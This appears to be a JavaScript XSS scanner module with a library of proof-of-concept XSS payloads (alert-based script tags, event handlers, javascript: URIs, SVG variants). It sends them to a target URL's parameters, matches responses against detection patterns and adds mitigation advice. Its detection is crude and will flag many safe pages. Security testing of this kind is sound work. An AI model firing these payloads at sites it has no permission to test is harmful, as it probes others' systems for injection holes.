/**
 * XSS Detection Tool - xss-strike-like functionality
 * Tests for Cross-Site Scripting vulnerabilities
 */

// XSS Payloads library
const XSS_PAYLOADS = [
  // Basic payloads
  '<script>alert("XSS")</script>',
  '<img src=x onerror="alert(\'XSS\')">',
  '<svg onload="alert(\'XSS\')">',
  '<iframe src="javascript:alert(\'XSS\')"></iframe>',
  '<body onload="alert(\'XSS\')">',
  '<input onfocus="alert(\'XSS\')" autofocus>',
  '<marquee onstart="alert(\'XSS\')"></marquee>',
  '<details open ontoggle="alert(\'XSS\')">',
  
  // Event handlers
  '<div onclick="alert(\'XSS\')">Click me</div>',
  '<div onmouseover="alert(\'XSS\')">Hover me</div>',
  '<audio src=x onerror="alert(\'XSS\')">',
  '<video src=x onerror="alert(\'XSS\')">',
  
  // Data URIs
  '<a href="javascript:alert(\'XSS\')">Click</a>',
  '<embed src="javascript:alert(\'XSS\')">',
  '<object data="javascript:alert(\'XSS\')">',
  
  // Encoded payloads
  '&lt;script&gt;alert("XSS")&lt;/script&gt;',
  '&#60;script&#62;alert("XSS")&#60;/script&#62;',
  '&#x3c;script&#x3e;alert("XSS")&#x3c;/script&#x3e;',
  
  // HTML5 payloads
  '<source src=x onerror="alert(\'XSS\')">',
  '<track src=x onerror="alert(\'XSS\')">',
  '<base href="javascript:alert(\'XSS\')">',
  
  // SVG payloads
  '<svg><script>alert("XSS")</script></svg>',
  '<svg><animate onbegin="alert(\'XSS\')" attributeName="x" dur="1s">',
  '<svg><set onbegin="alert(\'XSS\')" attributeName="x" dur="1s">',
];

// Dangerous patterns to check
const DANGEROUS_PATTERNS = [
  /javascript:/gi,
  /on\w+\s*=/gi,
  /<script/gi,
  /<iframe/gi,
  /<embed/gi,
  /<object/gi,
  /<img[^>]*src/gi,
  /<svg/gi,
  /<body[^>]*on/gi,
  /eval\(/gi,
  /expression\(/gi,
  /vbscript:/gi
];

export async function xssScan(url, testParameters = []) {
  const results = {
    url: url,
    timestamp: new Date().toISOString(),
    vulnerabilities: [],
    safeParameters: [],
    summary: {}
  };

  console.log(`🚨 Starting XSS scan on ${url}...`);

  // Test each parameter with XSS payloads
  for (const param of testParameters) {
    for (const payload of XSS_PAYLOADS) {
      try {
        const testUrl = `${url}?${param}=${encodeURIComponent(payload)}`;
        const response = await testUrlForXSS(testUrl);

        if (response.isVulnerable) {
          results.vulnerabilities.push({
            parameter: param,
            payload: payload,
            severity: response.severity || 'MEDIUM',
            type: identifyXSSType(payload),
            location: response.location || 'unknown',
            recommendation: getXSSRecommendation(param)
          });
        }
      } catch (error) {
        // Continue scanning
      }
    }
  }

  // Test HTML response for reflected XSS
  try {
    const reflectionTest = await testReflectionXSS(url, testParameters);
    if (reflectionTest.vulnerable) {
      results.vulnerabilities.push({
        type: 'REFLECTED_XSS',
        severity: 'HIGH',
        description: reflectionTest.description,
        recommendation: 'Properly escape all user input'
      });
    }
  } catch (error) {
    // Continue
  }

  // Generate summary
  results.summary = {
    totalScanned: testParameters.length * XSS_PAYLOADS.length,
    vulnerabilitiesFound: results.vulnerabilities.length,
    riskLevel: results.vulnerabilities.length > 0 ? 'CRITICAL' : 'SAFE',
    payloadsUsed: XSS_PAYLOADS.length
  };

  return results;
}

async function testUrlForXSS(testUrl) {
  return new Promise((resolve) => {
    try {
      fetch(testUrl, { timeout: 5000 })
        .then(res => res.text())
        .then(html => {
          const isVulnerable = detectXSSInResponse(html);
          resolve({
            isVulnerable: isVulnerable,
            severity: isVulnerable ? 'HIGH' : 'SAFE'
          });
        })
        .catch(() => resolve({ isVulnerable: false }));
    } catch (error) {
      resolve({ isVulnerable: false });
    }
  });
}

function detectXSSInResponse(html) {
  for (const pattern of DANGEROUS_PATTERNS) {
    if (pattern.test(html)) {
      return true;
    }
  }
  return false;
}

async function testReflectionXSS(url, parameters) {
  const testPayload = 'xss_test_' + Math.random().toString(36).substring(7);
  const testUrl = parameters.length > 0 
    ? `${url}?${parameters[0]}=${testPayload}`
    : url;

  try {
    const response = await fetch(testUrl, { timeout: 5000 });
    const html = await response.text();

    if (html.includes(testPayload)) {
      return {
        vulnerable: true,
        description: 'User input reflected in response without encoding'
      };
    }
  } catch (error) {
    // Continue
  }

  return { vulnerable: false };
}

function identifyXSSType(payload) {
  if (payload.includes('javascript:')) return 'JAVASCRIPT_PROTOCOL';
  if (payload.includes('on') && payload.includes('=')) return 'EVENT_HANDLER';
  if (payload.includes('<script')) return 'SCRIPT_TAG';
  if (payload.includes('<img') || payload.includes('<svg')) return 'IMAGE_SVG';
  if (payload.includes('eval')) return 'EVAL_INJECTION';
  return 'UNKNOWN';
}

function getXSSRecommendation(parameter) {
  return `
    1. Sanitize input parameter "${parameter}" on both client and server
    2. Use Content Security Policy (CSP) headers
    3. Encode output to HTML entities
    4. Use templating engines with auto-escaping
    5. Validate input whitelist approach
    6. Use security libraries (DOMPurify, sanitize-html)
  `;
}

// DOM-based XSS detection
export function detectDOMXSSVulnerabilities(htmlContent) {
  const vulnerabilities = [];

  const domXSSPatterns = [
    {
      pattern: /\.innerHTML\s*=\s*(?!encodeURIComponent|escape)/,
      issue: 'innerHTML assignment without sanitization'
    },
    {
      pattern: /eval\s*\(\s*(?!.*JSON\.parse)/,
      issue: 'eval() usage with unsanitized input'
    },
    {
      pattern: /document\.write\s*\(/,
      issue: 'document.write() can be exploited'
    },
    {
      pattern: /\.location\s*=\s*(?!https?:|\/)/,
      issue: 'Dangerous location assignment'
    },
    {
      pattern: /setTimeout\s*\(\s*(?!function)/,
      issue: 'setTimeout with string parameter'
    }
  ];

  domXSSPatterns.forEach(({ pattern, issue }) => {
    if (pattern.test(htmlContent)) {
      vulnerabilities.push({
        type: 'DOM_XSS',
        severity: 'HIGH',
        issue: issue,
        recommendation: 'Use safer alternatives like textContent, createElement'
      });
    }
  });

  return vulnerabilities;
}

// Stored XSS detection
export function detectStoredXSSRisks(forms, inputs) {
  const risks = [];

  inputs.forEach(input => {
    const hasValidation = input.hasAttribute('pattern') || 
                         input.getAttribute('type') !== 'text';
    const isSanitized = input.hasAttribute('data-sanitize');

    if (!hasValidation && !isSanitized) {
      risks.push({
        input: input.name || input.id || 'unknown',
        risk: 'User input not validated or sanitized',
        severity: 'HIGH',
        recommendation: 'Add input validation and server-side sanitization'
      });
    }
  });

  return risks;
}

export function generateXSSReport(results) {
  let report = `
XSS VULNERABILITY REPORT
========================
URL: ${results.url}
Scan Date: ${results.timestamp}

SUMMARY:
--------
Payloads Tested: ${results.summary.payloadsUsed}
Vulnerabilities Found: ${results.summary.vulnerabilitiesFound}
Risk Level: ${results.summary.riskLevel}

VULNERABILITIES:
----------------
`;

  if (results.vulnerabilities.length === 0) {
    report += 'No XSS vulnerabilities detected in this scan.\n';
  } else {
    results.vulnerabilities.forEach((vuln, index) => {
      report += `
${index + 1}. ${vuln.type} (${vuln.severity})
   Parameter: ${vuln.parameter || 'N/A'}
   Payload: ${vuln.payload ? vuln.payload.substring(0, 50) + '...' : 'N/A'}
   Recommendation: ${vuln.recommendation}
`;
    });
  }

  report += `
MITIGATION STRATEGIES:
----------------------
1. Input Validation: Whitelist allowed characters
2. Output Encoding: Convert < > " ' & to HTML entities
3. Content Security Policy: Restrict script sources
4. HttpOnly Cookies: Prevent JavaScript access
5. X-XSS-Protection: Enable browser XSS filters
6. Use Security Libraries: DOMPurify, sanitize-html
`;

  return report;
}
